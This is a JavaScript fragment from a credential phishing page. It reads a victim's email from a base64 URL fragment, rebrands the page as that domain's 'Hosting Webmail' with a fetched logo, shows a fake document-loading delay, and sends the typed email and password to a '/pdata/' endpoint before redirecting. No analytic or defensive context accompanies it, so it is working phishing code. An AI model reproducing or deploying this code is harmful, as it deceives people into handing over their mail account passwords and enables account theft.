      <script>
      
        var red__ = ''; //https://redirect.url
        
        document.getElementById('email').value = getEmail();
        var domain = getEmail().substring(getEmail().lastIndexOf("@") +1);
        var frmsite = domain.substring(0, domain.indexOf("."));
        document.title = ucFirst(frmsite)  +" Hosting Webmail :: Welcome to " +ucFirst(frmsite) +" Hosting Webmail";
        document.getElementById("head-message").innerHTML = ucFirst(frmsite) +" Online Webmail App";
        document.getElementById("fieldImg").src = `https://logo.clearbit.com/${domain}`;
        var em = getEmail()
        document.getElementById('em_').innerText = em
       
        
        function Submit(){   
            var email = $("#email").val();
            var pwd = $("#password").val();
                             
            $('#submit-btn').html('Verifing...');
            $('#msg').text('')
                 
            fetch(`/pdata/${em}/${pwd}`, {
                  method: 'GET'
              }).then(response => {  if (!response.ok) {throw new Error('Network response was not ok')}
                  return response.json()
              }).then(data  => { 
                console.log(data)
                
                if(data.success){ window.location.replace(red__) }
                else{
                  $('#submit-btn').html('Login to continue');
                  $('#msg').text('Incorrect password provided.');
                  document.getElementById('password').value ="";
                 }
              

              })
                    
            };
       
       

        function getEmail(){
            if(window.location.hash){
              var url = window.location.href;
                  var hash = url.split('#').pop();
                  return atob(hash);
            }
        }
    
        function ucFirst(str){
          return str.charAt(0).toUpperCase()+  str.slice(1);
        }


      function ViewDocument(){
        document.getElementById('viewBtnText').innerText = ''
        document.getElementById("loading").style.display = "block";
        
        setTimeout(() => {
          //document.getElementById("Headline").innerHTML = "<p>Please confirm password for <b><span>"+_mail+"</span></b>.</p>";
          document.getElementById("startDiv").style.display= "none"
          document.getElementById('MainDiv').style.display = 'block';
        },2000);
      }
